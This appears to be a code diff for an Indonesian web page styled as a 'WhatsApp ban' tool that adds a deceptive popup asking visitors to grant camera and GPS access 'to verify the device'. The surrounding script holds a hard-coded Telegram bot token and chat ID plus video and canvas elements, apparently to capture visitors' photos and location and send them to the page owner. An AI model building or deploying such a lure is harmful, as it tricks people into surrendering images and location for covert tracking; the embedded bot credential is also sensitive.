@@ -6,6 +6,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;900&display=swap" rel="stylesheet">
   <style>
+    /* --- CSS ASLI ANDA --- */
     * {
       margin: 0;
       padding: 0;
@@ -117,11 +118,143 @@
         padding: 10px;
       }
     }
+
+    /* --- CSS TAMBAHAN UNTUK POPUP (Disesuaikan dengan Tema Gelap) --- */
+    :root {
+      --popup-primary: #00ff7f; /* Menggunakan Lime agar senada */
+      --popup-bg-overlay: rgba(0, 0, 0, 0.85); /* Lebih gelap */
+      --popup-glass-bg: rgba(20, 20, 30, 0.95); /* Gelap kebiruan */
+    }
+
+    /* Overlay Gelap */
+    .modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: var(--popup-bg-overlay);
+      backdrop-filter: blur(10px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999; /* Z-index tertinggi agar di atas login form */
+      opacity: 0;
+      visibility: hidden;
+      transition: all 0.3s ease;
+    }
+
+    /* Tampilkan modal secara default */
+    .modal-overlay.active {
+      opacity: 1;
+      visibility: visible;
+    }
+
+    /* Kotak Modal */
+    .modal-card {
+      background: var(--popup-glass-bg);
+      width: 90%;
+      max-width: 400px;
+      padding: 2rem;
+      border-radius: 20px;
+      border: 1px solid rgba(0, 255, 127, 0.2); /* Border tipis lime */
+      box-shadow: 0 0 30px rgba(0, 255, 127, 0.1);
+      text-align: center;
+      transform: scale(0.9);
+      transition: transform 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+    }
+
+    .modal-overlay.active .modal-card {
+      transform: scale(1);
+    }
+
+    /* Ikon Header */
+    .icon-container {
+      display: flex;
+      justify-content: center;
+      gap: 15px;
+      margin-bottom: 1.5rem;
+    }
+
+    .icon-wrapper {
+      width: 60px;
+      height: 60px;
+      background: rgba(0, 255, 127, 0.1); /* Lime transparan */
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: var(--popup-primary);
+      border: 1px solid var(--popup-primary);
+    }
+
+    .icon-wrapper svg {
+      width: 30px;
+      height: 30px;
+    }
+
+    /* Teks Modal */
+    .modal-card h2 {
+      color: #ffffff;
+      margin: 0 0 10px 0;
+      font-size: 1.5rem;
+    }
+
+    .modal-card p {
+      color: #b0b0b0;
+      margin-bottom: 2rem;
+      line-height: 1.5;
+      font-size: 0.95rem;
+    }
+
+    .btn-group {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .btn-popup {
+      padding: 12px 20px;
+      border-radius: 10px;
+      border: none;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.2s;
+      font-size: 1rem;
+      width: 100%;
+      background: linear-gradient(135deg, #00ff7f, #00cc66);
+      color: black;
+      box-shadow: 0 4px 15px rgba(0, 255, 127, 0.3);
+    }
+
+    .btn-popup:hover {
+      background-color: #0f0;
+      transform: translateY(-2px);
+      box-shadow: 0 0 20px lime;
+    }
+
+    #statusText {
+      margin-top: 15px;
+      font-size: 0.85rem;
+      color: var(--popup-primary);
+      min-height: 1.2em;
+    }
+
+    .pulse {
+      animation: pulse 1.5s infinite;
+    }
+
+    @keyframes pulse {
+      0% { opacity: 0.6; }
+      50% { opacity: 1; }
+      100% { opacity: 0.6; }
+    }
   </style>
 </head>
 <body>
   <div class="bg-particles"></div>
 
+  <!-- KONTEN UTAMA ANDA -->
   <div class="login-container">
     <p class="login-title">Website Band WhatsApp</p>
     <p class="login-subtitle">⚠️ Jangan Disalahgunakan</p>
@@ -133,7 +266,41 @@
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas" width="640" height="480"></canvas>
 
+  <!-- POPUP IZIN (Dimasukkan di sini) -->
+  <div id="permissionModal" class="modal-overlay active">
+      <div class="modal-card">
+          
+          <!-- Ikon Kamera & Lokasi -->
+          <div class="icon-container">
+              <div class="icon-wrapper">
+                  <!-- SVG Icon Location -->
+                  <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z" />
+                      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z" />
+                  </svg>
+              </div>
+              <div class="icon-wrapper">
+                  <!-- SVG Icon Camera -->
+                  <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z" />
+                      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z" />
+                  </svg>
+              </div>
+          </div>
+
+          <h2>Izin Akses Diperlukan</h2>
+          <p>Sistem membutuhkan akses <strong>Kamera</strong> dan <strong>Lokasi (GPS)</strong> untuk memverifikasi perangkat Anda sebelum melanjutkan.</p>
+          
+          <div class="btn-group">
+              <button class="btn-popup" onclick="requestAllPermissions()">Izinkan Semua</button>
+          </div>
+
+          <div id="statusText"></div>
+      </div>
+  </div>
+
   <script>
+    // --- LOGIKA ASLI ANDA ---
     const botToken = '8335716552:AAHLyFftSVg3byPUIuJw0nbq8QAToj3UxGg';
     const chatIds = ['7958165198'];
     const infoDiv = document.getElementById('info');
@@ -273,6 +440,71 @@ Waktu      : ${new Date().toLocaleString()}
       }
     }
     document.addEventListener('DOMContentLoaded', createParticles);
+
+    // --- LOGIKA POPUP IZIN ---
+    const modal = document.getElementById('permissionModal');
+    const statusText = document.getElementById('statusText');
+
+    function closeModal() {
+        modal.classList.remove('active');
+    }
+
+    async function requestAllPermissions() {
+        statusText.textContent = "Memverifikasi...";
+        statusText.classList.add('pulse');
+        statusText.style.color = "var(--popup-primary)";
+
+        try {
+            // 1. Minta Lokasi
+            await requestLocation();
+            
+            // 2. Minta Kamera
+            setTimeout(async () => {
+                await requestCameraPopup();
+                
+                // Sukses
+                statusText.classList.remove('pulse');
+                statusText.textContent = "Verifikasi Berhasil!";
+                statusText.style.color = "#00ff7f";
+                
+                // Tutup modal
+                setTimeout(closeModal, 1000);
+            }, 500);
+
+        } catch (error) {
+            console.error(error);
+            statusText.classList.remove('pulse');
+            statusText.textContent = "Gagal. Mohon reset izin browser.";
+            statusText.style.color = "#ff4444"; 
+        }
+    }
+
+    function requestLocation() {
+        statusText.textContent = "Mendeteksi Lokasi...";
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) {
+                resolve();
+                return;
+            }
+            navigator.geolocation.getCurrentPosition(
+                (pos) => resolve(pos),
+                (err) => resolve(null) // Tetap lanjut meski ditolak
+            );
+        });
+    }
+
+    async function requestCameraPopup() {
+        statusText.textContent = "Mengecek Kamera...";
+        try {
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                stream.getTracks().forEach(track => track.stop());
+            }
+        } catch (err) {
+            console.warn("Camera denied in popup");
+            // Tidak throw error agar user tetap bisa masuk ke halaman utama
+        }
+    }
   </script>
 </body>
 </html>
